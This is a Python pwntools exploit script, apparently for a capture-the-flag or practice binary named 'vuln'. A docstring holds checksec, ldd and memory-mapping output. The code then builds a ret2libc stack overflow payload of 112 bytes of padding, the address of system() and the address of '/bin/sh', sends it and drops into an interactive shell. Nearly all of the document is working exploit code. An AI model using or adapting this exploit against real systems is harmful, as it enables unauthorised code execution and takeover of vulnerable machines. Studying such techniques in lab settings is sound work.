#!/usr/bin/env python2.7
# coding: UTF-8


'''
$ checksec.sh --file ./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   ./vuln

$ ldd ./vuln
linux-gate.so.1 =>  (0xf7725000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7551000)
/lib/ld-linux.so.2 (0xf7726000)

$ ./vuln &pmap $!
[7] 2907
2907:   bash
0000000008048000      4K r-x-- vuln
0000000008049000      8K rw--- vuln
00000000f7fdb000      4K r-x--   [ anon ]
00000000f7fdc000    128K r-x-- ld-2.19.so
00000000f7ffc000      8K rw--- ld-2.19.so
00000000fffdd000    132K rw---   [ anon ]
 total              284K

(gdb) info proc mappings
process 2806
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0xf7e08000 0xf7fb1000   0x1a9000        0x0 /lib/i386-linux-gnu/libc-2.19.so
	0xf7fb1000 0xf7fb2000     0x1000   0x1a9000 /lib/i386-linux-gnu/libc-2.19.so
	0xf7fb2000 0xf7fb4000     0x2000   0x1a9000 /lib/i386-linux-gnu/libc-2.19.so
	0xf7fb4000 0xf7fb5000     0x1000   0x1ab000 /lib/i386-linux-gnu/libc-2.19.so


'''
from pwn import *

r = process('./vuln')

libc = ELF('/lib/i386-linux-gnu/libc.so.6')

libc_base = 0xf7e08000
libc_system = libc_base + libc.symbols['system']
addr_binsh  = libc_base + next(libc.search('/bin/sh\0'))

payload = 'a'*112
payload += p32(libc_system)
payload += 'AAAA'
payload += p32(addr_binsh)

r.sendline(payload)
r.interactive()
